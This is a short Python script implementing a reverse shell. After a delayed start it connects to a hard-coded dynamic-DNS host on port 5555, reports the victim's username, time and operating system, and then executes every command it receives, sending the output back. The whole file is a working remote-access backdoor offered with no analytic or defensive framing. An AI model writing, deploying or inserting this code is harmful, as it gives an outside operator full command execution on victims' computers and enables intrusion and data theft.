import os
import time
import socket
import platform


class Sock_Client():
    def __init__(self):
        self.tiempo = 120
        self.whois = os.popen("whoami").read()
        self.platform = platform.system()
        self.time = time.ctime()
        self.host = "colegiosanmarcos.zapto.org" #Input your host
        self.port = 5555
        self.structure = (f"---Computer--- : {self.whois}"
                          f"---Date Time--- : {self.time}\n"
                          f"---Platform--- : {self.platform}\n")
        self.buffer = 1080

    def sock(self):
        time.sleep(self.tiempo)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        
        try:
            sock.send(self.structure.encode())

            while True:
                command = sock.recv(self.buffer).decode()

                
                output = os.popen(command).read()

                if not output:
                    output = "[*Customer Message]: There is no way out"

                sock.sendall(output.encode())

        except Exception as err:
            print(f"[!] Client error: {err}")

if __name__ == "__main__":
    cliente = Sock_Client()
    cliente.sock()
